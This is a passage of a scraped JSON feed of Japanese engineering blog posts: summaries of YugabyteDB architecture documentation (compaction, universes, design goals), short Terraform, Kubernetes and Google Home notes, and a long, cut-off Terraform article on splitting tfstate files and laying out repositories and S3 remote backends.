Compactionはスペースアンプリフィケーション2が大きいという問題があるが、YugabyteDBではテーブルは複数のタブレットに分割され、タブレット間でのConcurrent Compactionは特定の最大値まで絞られるため問題になりにくい。YugabyteDBでは凡そ10-20%のスペースアンプリフィケーションにおさまる。つまりSize-tired Compaction一単位が扱うデータ量を小さく(タブレット化)して、同時に実行される圧縮処理数を絞ることで特定のタイミングで圧縮に使用されるストレージ容量を抑えているということ？Throttled compactionsYB-TServerではタブレット間で実行される圧縮処理の同時実行数を制限することで、圧縮処理が多量のリソースを占有することを防いでいる。この機能は圧縮されるファイル同士のサイズを比べ、実行される圧縮処理が妥当であることを確認することで実現されている。Small and large compaction queuesYB-TServerでは圧縮処理を大きい圧縮処理と小さい圧縮処理に分けて優先度を決めることで、I/Oが大きな場合でもシステムの機能を保っている。YugabyteDBでは圧縮処理数を制限することに加え、様々な最適化を実行することで圧縮処理の影響を最小化している。Manual compactionYugabyteDBではyb-admin utilityのcompact_tableコマンドにより、任意のタイミングでテーブルに対して圧縮を実行することが出来る。この方法はデータが新しく書き込まれない場合や、DDLやTTLの超過によるデータ削除時によりデータが断片化したときに有効である。Statistics-based full compactions to improve read performanceYugabyteDBでは読み込まれたkey-valueペアをDocDBレベルで監視している。監視対象となる時間軸はauto-compact-stat-window-secondsで管理されている。YugabyteDBがデータ読み込み時に多量の廃棄されたデータのスキップを検知した場合、full compactionがトリガーされ不要なキーの削除が行なわれる。Full compactionがトリガーされる詳細な条件は対象の時間軸で以下が満された時である。廃棄されたキーとアクティブなキーが読まれる割り合いがauto-compact-percent-obsoleteで定義された閾値を超たとき。廃棄されたキーの読み込みauto-compact-min-obsolete-keys-foundで定義された閾値を超たとき。この機能はTTLを設定したテーブルと互換性があり、TTL file expirationが有効なテーブルではスケジュールされた圧縮を実行しない。Scheduled full compactionsYugabyteDBでは全てのデータに対するデータ圧縮をスケジュール実行することが出来る。スケジュール実行はscheduled-full-compaction-frequency-hoursとscheduled-full-compaction-jitter-factor-percentageのフラグで管理される。この機能は大量のDELETEとUPDATEを定常的に実行するワークロードでのパフォーマンスとディスクスペースの再割り当てに有効である。スケジュール化したデータ圧縮はTTLと互換しているが、TTL file expirationとは互換していない。つまりスケジュールされた圧縮は実行されない。Server-global memstore limitServer-global memstore limitは一つのYB-TServer上のタブレット間でシェアされるメモリサイズを追跡し、強制する。この機能はタブレット間の書き込みに偏りがある場合に有効である。一つのテーブルに書き込みが集中しているばあい、メモリ制限以上のメモリを割り当てることでパフォーマンスを向上させることが出来る。Auto-sizing of block cache and memstoreBlock Cacheとmemstoreは何れも多量のメモリを使用している。これらはtablet-peer間で共有されるリソースのため、メモリ管理とこれらのコンポーネントの様々な環境に合せたサイジングを容易にしている。YB-TServerでは自動で特定の割合のメモリをBlock CacheとMemstoreに割り当てる。Distributing tablet load uniformly across data disks複数のSSDを利用するハードウェアでは、テーブルのデータ(SSTable)とWALはテーブル毎に利用可能なディスクに均等に分散される。このストライピングと呼ばれる負荷分散は、それぞれのディスクがそれぞれのテーブルの負荷を均等に処理することを保証する。SSDで実際に書き込んだデータより書き込み量が増幅する現象。もちろんライトアンプリフィケーションが小さいほうが望ましい。↩↩","isoDate":"2023-08-02T16:13:24.000Z","dateMiliSeconds":1690992804000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day2","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/2_key_concepts_universe","contentSnippet":"YugabyteDBのドキュメントを全部読む Day2前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Design goalsを読みました。今回はArchitecture > Key Concepts > Universeを読みます。また画像は同ドキュメントより引用しています。UniverseYugabyteDBは耐久性とスケーラビリティを兼ねそなえた分散データベースを達成するために、Universe1と呼ばれるノードのグループを持っている。Universeはビジネス要件やレイテンシの兼ね合いでシングルゾーン、単一リージョンマルチゾーン、マルチリージョン、同期・非同期レプリケーションなどを選択することが出来る。UnivereはClusterと表現されることもある。データの構成Universeは一つ以上のネームスペースを持つことができ、またネームスペースは一つ以上のテーブルを持つことができる。YugabyteDBではUniverse上に存在するノードにまたがって保持されるテーブルを設定に従って、シャーディングし、レプリケーション、ロードバランシングを行なう。YugabyteDBはノードやディスク、ゾーンなどに発生した障害に自動で対応し、必要であればデータを新規に分散、レプリケーションを行なう。ネームスペースはYSQLではデータベースに対応し、ほかのDBにおけるネームスペースに対応する2。YCQLではキースペースに対応し、Cassandraのキースペースに対応している。サービスコンポーネントUniverseはYugabyteDB Tablet Server(YB-TServer)とYugabyteDB Master Server(YB-Master)の二つで構成されている。YB-MasterとYB-TServerはRaftにより分散されており、高可用性を達成している。YB-Tserverはテーブルを始めとしたユーザーデータの保存、提供を担当する。YB-Masterはシステムのメタデータを管理し、システム全体のテーブルに対するDDLやメンテナンスの実行、ロードバランシングといったオペレーションを管理する。UniverseとClusterUniverseは一つのプライマリクラスタとゼロ個以上のレプリカクラスタによって構成されている。プライマリクラスタプライマリクラスタはRead/Write両方の実行と、プライマリクラスタ内のノード間の同期的なレプリケーションを担当する。リードレプリカクラスタリードレプリカクラスタはRead処理のみを実行する。Write処理は自動的にプライマリクラスタにルーティングされる。リードレプリカクラスタを利用することで、地理的に分散したデータに対する読み取りの遅延を小さくすることができる。データはプライマリクラスタから非同期的にとりこまれる。これはRaftの書き込みには関与しないRaftオブザーバとして機能する。GoogleのCloud Spannerでも同様にUniverseと呼ばれている↩PostgreSQLではSchemaの裏側に存在するデータ構造↩","isoDate":"2023-07-26T15:03:13.000Z","dateMiliSeconds":1690383793000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"YugabyteDBのドキュメントを全部読む Day1","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/1_design_goals","contentSnippet":"Day1最近Twitter改めXで「俺はDBのドキュメント端から端まで読んで強くなった」というX\'s1を複数みかけました。周りのエンジニアに一歩差をつける方法として、フレームワークやミドルウェアやライブラリのドキュメントを最初から最後までちゃんと読む、というのがあって、これはマジでコスパ抜群です。— 徳永広夢 (@tokuhirom) July 21, 2023 確かに私のRedisはこれ。 https://t.co/2y1E01aLGw— maru (@maruloop) July 22, 2023 私のMySQLもこれ。 https://t.co/BxiOjeQVPk— yoku0825 (@yoku0825) July 22, 2023 俺のpostgresqlもこれ。 https://t.co/URRjyXCpGI— そーだい@初代ALF (@soudai1025) July 22, 2023 PostgreSQL系NewSQLで最強になりたいのでYugabyteDBのドキュメントを順番に読んで行きます。ドキュメントはv2.19に対応したものです。手始めにArchitectureの一番先頭にあるDesign goalsから読みはじめます。また画像は同ドキュメントより引用しています。Design goalsYugabyteDBは以下を達成することを目標としている。1. 分散トランザクションを提供しながら強い一貫性を保証する。2. Query APIを再発明せず、既存のクエリ言語への互換を達成する。3. 高いパフォーマンスを保証する。4. 地理的に分散したデプロイを可能にする。5. Cloud Native Databaseとしてデザインする。一貫性分断耐性YugabyteDBはCAPの定理で言えばCPを中心に高い可用性を供えたデータベースネットワーク分断などを起因とするSplit BrainはRaft Group内であたらしいリーダーを選出することで対応している。YugabyteDBではLeader Leaseという障害が発生しても常に一つのリーダが存在することを保証する仕組みを実装している。直列化可能性single-row Linearizable writeをサポートしている。ACIDトランザクションYugabyteDBではSeriarizable、Repetable Read、Read Committed Isolationの三つの分離レベルをサポートしている。YSQL APIではこれら3つの分離レベルをサポートしているが、YCQLではRepeatable Readのみに対応している。Query APIYugabyteDBではYSQLとYCQLという2種類のQuery APIをサポートしている。YSQLYSQLはPostgreSQLに互換したAPIでPostgreSQLのクエリレイヤを再利用している。新しい変更は互換性を崩さない。YSQLは新しいPostgreSQLに互換しつづけることを目標としている。YCQLYCQLはCassandraのクエイ言語から派生した半リレーショナルなクエリ言語で、Webスケールな膨大なwriteに対応してスケールし素早いデータ取得を目標としている。パフォーマンスC++で実装されているため高いパフォーマンスと巨大なHeap(RAM)をCacheとして利用できる。SSDとNVMeに最適化している。高いWriteスループットとクライアントの同時実行性、高いデータ密度、増加し続けるデータへの対応を目標としている。地理的分散Zone、Multi Region、Multi Cloudいずれにも対応している。これに対応するために、ノード障害やトラヒックのルーティングなどに対応できる必要がある。クラウドネイティブアーキテクチャパブリッククラウドやオンプレミスで利用される一般てきなハードウェアで利用可能にする。原子時計のような特別なものに依存しない。Kubernatesに対応している。OSSで提供している。https://twitter.com/SawyerMerritt/status/1683365478582951936↩","isoDate":"2023-07-25T15:01:52.000Z","dateMiliSeconds":1690297312000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Terraformでmapにkeyが含まれないときにスキップしたい","link":"https://zenn.dev/nnaka2992/articles/skip_when_key_does_not_exists_in_map_terraform","contentSnippet":"Google CloudではPublic IPを利用した際に割り振られる可能性のあるCIDRの一覧がcloud.jsonでJSON形式で公開されています。この記事は雑な検証用のTerraformで承認済みネットワークにasia-notheast1のCIDRを全部登録してやろうとしたとき、上記のJSONファイルからscopeがasia-northeast1のprefixes.ipv4Prefixを抜きだそうとしたときにハマったのでその対応方法のメモです 結論以下のような感じで書いたら対応できました。contains(keys(hoge), \\"fuga\\") # hogeのkeyにh...","isoDate":"2023-07-22T14:53:12.000Z","dateMiliSeconds":1690037592000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Kubernetes の upstream のキャッチアップ","link":"https://zenn.dev/toversus/articles/52b107ab103712","contentSnippet":"先日、Kubernetes Meetup Tokyo #59 で「KEP から眺める Kubernetes」というタイトルで発表しました。発表の後で Kubernetes の upstream のキャッチアップ方法について質問を受けました。その場で回答はしたのですが、ちょうど社内の共有会で似たような話をしたところだったので、加筆修正したものを公開しておきます。 はじめにKubernetes の upstream を追いかけ始めて 1 年ちょっと経ったので、その経験をまとめます。Kubernetes の upstream やエコシステムを観察しているだけで、コントリビュータではありま...","isoDate":"2023-07-20T10:18:32.000Z","dateMiliSeconds":1689848312000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"メールが届いたら Google Home で音声で通知する","link":"https://blog.1q77.com/2023/07/ses-lambda-and-cloud-pubsub/","contentSnippet":"以前、「LINE に送ったメッセージを Google Home に読み上げさせる」という記事を書きました。その時に作ったものに家にあるラズパイで Cloud PubSub を subscribe してメッセージが届いたらその内容を Text-to-Speach で音声化して Google Home で再生する仕組みが存在します。","isoDate":"2023-07-10T14:25:35.000Z","dateMiliSeconds":1688999135000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"コンテナセキュリティ","link":"https://speakerdeck.com/kyohmizu/kontenasekiyuritei","contentSnippet":"「コンテナセキュリティ - Forkwell Library#26」の資料です。\\rhttps://forkwell.connpass.com/event/287259/","isoDate":"2023-07-05T04:00:00.000Z","dateMiliSeconds":1688529600000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Terraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80】tfstateファイルの分割パターンとディレクトリ構成への適用","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/07/05/001756","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Terraformのtfstateファイルを分割する目的と、オススメの分割パターンについて (★で表現)Terraformのリポジトリやリモートバックエンドのディレクトリ構成の設計について記事のざっくりした内容は、以下のスライドからキャッチアップできちゃいます！    この記事から得られる知識01. はじめに02. なぜ tfstate ファイルを分割するのか分割しなかった場合分割した方がいい場合分割しない方がいい場合03. tfstate ファイルの分割分割の境界状態の依存関係図依存関係図とは依存関係の表現▼ 依存関係の表現記法▼ 依存関係がない場合▼ 依存関係がある場合04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ディレクトリ \uD83D\uDCC2 構成リモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割ディレクトリ構成05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成AWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存状態の依存関係図リポジトリのディレクトリ構成リモートバックエンドのディレクトリ構成06. tfstate ファイルの分割パターンオススメな設計の一覧大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合リモートバックエンドの場合07. 上層の分割 (推奨)上層の分割についてプロバイダーのアカウント別 - ★★★この分割方法について【プロバイダーアカウント別】状態の依存関係図【プロバイダーアカウント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【プロバイダーアカウント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合08. 下層の分割 (推奨)下層の分割について実行環境別 - ★★★この分割方法について【実行環境別】状態の依存関係図【実行環境別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合09. 中間層の分割 (任意)中間層の分割について運用チーム責務範囲別 - ★★この分割方法について【チーム別】状態の依存関係図【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合プロダクトのサブコンポーネント別 - ★★この分割方法について【サブコンポーネント別】状態の依存関係図【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合同じテナント内のプロダクト別この分割方法について【同じテナント内のプロダクト】状態の依存関係図【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【同じテナント内のプロダクト】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの種類グループ別この分割方法について【種類グループ別】状態の依存関係図【種類グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【種類グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合AWSリソースの状態の変更頻度グループ別この分割方法について【変更頻度グループ別】状態の依存関係図【変更頻度グループ別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合▼ 同じリポジトリの場合【変更頻度グループ別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合▼ 同じリモートバックエンドの場合10. おわりに謝辞記事関連のおすすめ書籍01. はじめにどうも、Mitchell Hashimoto です。さて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、チームが使っているTerraform\uD83E\uDDD1\uD83C\uDFFB‍\uD83D\uDE80のリポジトリをリプレイスする作業を担当しました。このリポジトリでは単一のtfstateファイルが状態を持ち過ぎている課題を抱えていたため、課題に合った適切な分割パターンでリプレイスしました。今回は、この時に整理した分割パターン (AWS向け) を記事で解説しました。もちろん、GoogleCloudやAzureでも読み換えていただければ、同じように適用できます。知る限りの分割パターンを記載したところ、情報量がエグいことになってしまったため、気になる分割パターンだけ拾って帰っていただけるとハッピーです\uD83D\uDE4Fそれでは、もりもり布教していきます\uD83D\uDE1702. なぜ tfstate ファイルを分割するのか%%{init: { \'theme\': \\"default\\", \'themeVariables\': { \'commitLabelFontSize\': \'13px\' }}}%%gitGraph   commit id: \\"8c8e6\\"   commit id: \\"0e3c3\\"     branch feature/foo     checkout feature/foo     commit id: \\"4e9e8\\"     commit id: \\"da005\\"   checkout main     branch feature/bar     commit id: \\"2d52f\\"   checkout main   commit id: \\"e74d6\\"     branch feature/baz     commit id: \\"f6881\\"分割しなかった場合そもそも、なぜtfstateファイルを分割する必要があるのでしょうか。tfstateファイルを分割しなかったと仮定します。様々なインフラコンポーネントを単一のtfstateファイルで状態を持つ場合、1回のterraformコマンド全てのコンポーネントの状態を操作できて楽です。ただし、複数の作業ブランチがある状況だと煩わしいことが起こります。各作業ブランチでインフラコンポーネントの状態を変更しかけていると、他の作業ブランチから影響を受け、terraformコマンドでtargetオプションが必要になってしまいます。他にも、terraformコマンドの完了に時間がかかりすぎるといった問題も起こるかもしれません。単一のtfstateファイルで管理するコンポーネントが多くなるほど、これらの問題は顕著になります。分割した方がいい場合その一方で、tfstateファイルをいい感じに分割したと仮定します。各作業ブランチでは、まるで暗黙的にtargetオプションがついたように、他の作業ブランチから影響を受けずにterraformコマンドを実行できます。よって、各tfstateファイルを操作できる管理者は互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Terraform: Up and Running: Writing Infrastructure as CodeOrganizing With Multiple States - DevOps with Terraform - CloudCasts分割しない方がいい場合運用ルールや開発者人数が理由で作業が衝突せず、targetオプションが必要ない状況であれば、tfstateファイルは分割しなくてもよいでしょう。tfstateファイルを分割するメリットが少ないです\uD83D\uDE45\uD83C\uDFFB‍03. tfstate ファイルの分割分割の境界それでは、tfstateファイルの分割の境界はどのようにして見つければよいのでしょうか。これを見つけるコツは、できるだけ相互に依存しないインフラリソースの関係 に注目することだと考えています。ここでいう依存とは、\\"tfstateファイルが他のtfstateファイルの状態を使用すること\\" です。もう少し具体的に言語化すると、\\"特定のインフラリソースが他の設定値を参照すること\\" です。状態をほとんど使用し合わない (互いに設定値の参照数が少ない) インフラリソース同士を、異なるtfstateファイルで管理します。異なるtfstateファイルで管理できる分割パターンについては後述します。▶ 『依存』という用語についてtfstateファイルでも同じ用語で表現することにしました。@tmknom さんが述べている通り、Terraformをよりよく設計するためには、『ソフトウェアの基礎知識』が必要です\uD83D\uDC4D状態の依存関係図依存関係図とは分割したtfstateファイル間の状態の依存関係を表現した図です。プロバイダーのアカウントの状態をtfstateファイルで管理していることを想像してみてください。%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"tfstateファイル\\"]    end似たものとしてterraform graphコマンドによるグラフがありますが、これはインフラリソース間の依存関係図です。tfstateファイル間で相互に依存関係があるからといって、個別のインフラリソース間で循環参照が起こってしまうというわけではないです。続いて、依存関係がある場合と無い場合で、どのような依存関係図になるかを紹介していきます。Command: graph | Terraform | HashiCorp Developer依存関係の表現▼ 依存関係の表現記法tfstateファイル間で状態の依存関係がある場合、これを図で表現すると分割の状況がわかりやすくなります。『依存』は、---\x3e (波線矢印) で表現することとします。依存関係がある場合については、後述します。▶ 『依存』の波線矢印について---\x3e (波線矢印) で表現します。そのため便宜上、tfstateファイルでも同じ記号で表現することにしました\uD83D\uDC4D▼ 依存関係がない場合例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、 tfstate ファイル間に依存関係はないとします。そのため、想定される状態の依存関係図は以下の通りになります。tfstateファイル間に依存関係がない状況がベストです。---title: tfstateファイル間に依存関係はない---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end▼ 依存関係がある場合同様に分割したと仮定します。ここで仮定した状況では、 foo-tfstate ➡︎ bar-tfstate の方向に依存しているとします。そのため、---\x3e (波線矢印) を使用して、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: foo-tfstateファイルは、bar-tfstateファイルに依存---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph AWSアカウント        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. 依存 .-> bar04. tfstate ファイルに基づくその他の設計リポジトリ \uD83D\uDC31 の設計リポジトリ分割ここまでで、tfstateファイル分割について簡単に紹介しました。リポジトリの分割は、tfstateファイル分割に基づいて設計しましょう。可能であれば、1個のリポジトリに1個のtfstateファイルをおくことが望ましいです。異なるリポジトリにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83D\uDC31 foo-repository/├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する...\uD83D\uDC31 bar-repository/├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する...ディレクトリ \uD83D\uDCC2 構成リポジトリ内のディレクトリ構成も、tfstateファイル分割に基づいて設計しましょう。率直に言うと、Terraformのディレクトリ構成のパターンは無数にあります。そのため、基準なしにディレクトリ構成を考えると何でもあり になってしまいます。その一方で、tfstateファイル分割に基づいて設計することにより、明確なディレクトリ構成パターン として抽出可能になります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ...▶ ローカルモジュールのディレクトリ構成の設計についてresource、data) のセットを使い回すことを目的とした、ローカルモジュールがあります。今回、これのディレクトリ構成は設計に含めていません。混同しやすいのですが、tfstateファイル分割に基づくディレクトリ構成とローカルモジュール内のそれは、全く別のテーマとして切り離して考えることができます\uD83D\uDC4Dリモートバックエンド \uD83E\uDEA3 の設計リモートバックエンド分割本記事では、リモートバックエンドとしてAWS S3バケットを使用することを想定しています。リモートバックエンドの分割は、tfstateファイル分割に基づいて設計しましょう。異なるリモートバックエンドにtfstateファイルをおいた方がよい場合については、分割パターン で説明しています。\uD83E\uDEA3 foo-bucket/│└── terraform.tfstate # fooコンポーネントの状態を持つ\uD83E\uDEA3 bar-bucket/│└── terraform.tfstate # barコンポーネントの状態を持つディレクトリ構成もし、リモートバックエンドをtfstateファイル分割に基づいて分割しなかったとします。その場合は、代わりにリモートバックエンド内のディレクトリ構成をtfstateファイル分割に基づいて設計しましょう。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo/│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar/      └── terraform.tfstate # barコンポーネントの状態を持つ05. 状態の依存関係の定義方法terraform_remote_stateブロックの場合terraform_remote_stateブロックによる依存terraform_remote_stateブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                        デメリット \xd7                                                                                                                                                      可読性                 -                                                                                  terraform_remote_stateブロックに加えてoutputブロックも実装が必要であり、outputブロックは依存先のAWSリソースが一見してわかりにくい。                             拡張性                 依存先のAWSリソースに関わらず、同じterraform_remote_stateブロックを使い回せる。  -                                                                                                                                                                     保守性                 -                                                                                  依存先と依存元の間でTerraformのバージョンに差がありすぎると、tfstateファイル間で互換性がなくなり、terraform_remote_stateブロックの処理が失敗する。 本記事では、 terraform_remote_state ブロックを使用して、状態の依存関係を定義 していきます。tfstateファイルが他のtfstateファイルに依存する方法として、後述のAWSリソース別dataブロックがあります。The terraform_remote_state Data Source | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: terraform_remote_stateブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。ディレクトリの設計方法は、分割パターン で説明しています。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── remote_state.tf # terraform_remote_stateブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── output.tf # 他の tfstate ファイルから依存される      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。resource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id = data.terraform_remote_state.bar.outputs.bar_vpc_id  ...}data \\"terraform_remote_state\\" \\"bar\\" { backend = \\"s3\\"  config = {    bucket = \\"tfstate\\"    key    = \\"bar/terraform.tfstate\\"    region = \\"ap-northeast-1\\"  }}# VPCの状態は、bar-tfstate ファイルで持つoutput \\"bar_vpc_id\\" {  value = aws_vpc.bar.id}resource \\"aws_vpc\\" \\"bar\\" {  ...}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つAWSリソース別dataブロックの場合AWSリソース別dataブロックによる依存AWSリソース別dataブロックには、以下のメリデメがあります。 アーキテクチャ特性  メリット ⭕️                                                                                                                                     デメリット \xd7                                                 可読性                 依存先のAWSリソースがわかりやすい。                                                                                                             -                                                                拡張性                 -                                                                                                                                               依存先のAWSリソース別dataブロックが必要である。                保守性                 依存先と依存元の間でTerraformのバージョンに差があっても、tfstateファイル間で直接的に依存するわけではないため、バージョン差の影響を受けない。  -                                                 今回は使用しませんが、依存関係の他の定義方法として、AWSリソース別dataブロックがあります。これは、tfstateファイルが自身以外 (例：コンソール画面、他のtfstateファイル) で作成されたAWSリソースの状態に依存するために使用できます。terraform_remote_stateブロックとは異なり、直接的にはtfstateファイルに依存しません。AWSリソース別dataブロックの場合は、実際のAWSリソースの状態に依存することにより、間接的にAWSリソースのtfstateファイルに依存することになります。Data Sources - Configuration Language | Terraform | HashiCorp Developer状態の依存関係図例えば、AWSリソース別dataブロックも同様にして、AWSリソースからなるプロダクトをいくつかのtfstateファイル (foo-tfstate、bar-tfstate) に分割したと仮定します。ここで仮定した状況では、bar-tfstateファイルはVPCの状態を持っており、 foo-tfstate ファイルは bar-tfstate ファイルに依存しているとします。想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: dataブロックを使用した依存関係---%%{init:{\'theme\':\'default\'}}%%flowchart TD    subgraph bucket        foo[\\"foo-tfstate\\"]        bar[\\"bar-tfstate\\"]    end    foo -. VPCの状態に依存 .-> barリポジトリのディレクトリ構成ディレクトリ構成は、tfstateファイル分割に基づいて、以下の通りになります。\uD83D\uDC31 repository/├── \uD83D\uDCC2 foo/│    ├── backend.tf # fooコンポーネントの状態を持つ tfstate ファイルを指定する│    ├── data.tf # dataブロックを使用し、bar-tfstate ファイルに依存する│    ├── provider.tf│    ...│└── \uD83D\uDCC2 bar/      ├── backend.tf # barコンポーネントの状態を持つ tfstate ファイルを指定する      ├── provider.tf      ...foo-tfstateファイルがbar-tfstateファイルに依存するために必要な実装は、以下の通りになります。# fooリソースの状態は、foo-tfstate ファイルで持つresource \\"example\\" \\"foo\\" {  # fooリソースは、bar-tfstate ファイルのVPCに依存する  vpc_id     = data.aws_vpc.bar.id}# VPCの状態は、bar-tfstate ファイルで持つdata \\"aws_vpc\\" \\"bar\\" {  filter {    name   = \\"tag:Name\\"    values = [\\"<bar-tfstateが持つVPCの名前>\\"]  }}リモートバックエンドのディレクトリ構成tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 foo│    └── terraform.tfstate # fooコンポーネントの状態を持つ│└── \uD83D\uDCC2 bar      └── terraform.tfstate # barコンポーネントの状態を持つ06. tfstate ファイルの分割パターンオススメな設計の一覧前述の通り、tfstateファイルの分割の境界は、『他の状態にできるだけ依存しないリソースの関係』から見つけることができます。分割しすぎると terraform_remote_stateブロック地獄 になるため、細かすぎず粗すぎない適切な境界を見つけていきましょう。今回は、私が考える分割パターンをいくつか紹介します。全てが実用的なパターンというわけでないため、オススメするものを ★ としています。推奨・任意    tfstate分割パターン大分類    tfstate分割パターン小分類オススメ    対応するリポジトリ構成 \uD83D\uDC31    対応するリモートバックエンド構成 \uD83E\uDEA3  推奨    上層    プロバイダーのアカウント別    ★★★    リポジトリ自体または上層ディレクトリ    リモートバックエンド自体または上層ディレクトリ  下層実行環境別    ★★★    下層ディレクトリ    下層ディレクトリ  任意    中間層    運用チーム責務範囲別    ★★    中間層ディレクトリ    中間層ディレクトリ  プロダクトのサブコンポーネント別    ★★  運用チーム責務範囲別\xd7プロダクトのサブコンポーネント別(組み合わせ)    ★  同じテナント内のプロダクト別      AWSリソースの種類グループ別      AWSリソースの状態の変更頻度グループ別      大分類 (上層/下層/中間層) とディレクトリ構成の関係リポジトリの場合記事内のここ で、リポジトリ内のディレクトリ構成はtfstateファイル分割に基づいて設計するべき、という説明をしました。tfstateファイルの分割パターンは、上層/下層/中間層 の層に大別できます。これらの層は、以下の通りリポジトリ自体・ディレクトリ構成の設計方法に影響します。# リポジトリ自体を分割する場合\uD83D\uDC31 上層/├── \uD83D\uDCC2 中間層/│    ├── \uD83D\uDCC2 下層/│    │    ├── backend.tfvars # 分割された tfstate ファイルを指定する│    │    ...│    │...# リポジトリ内のディレクトリを分割する場合\uD83D\uDC31 リポジトリ/├── \uD83D\uDCC2 上層/│    ├── 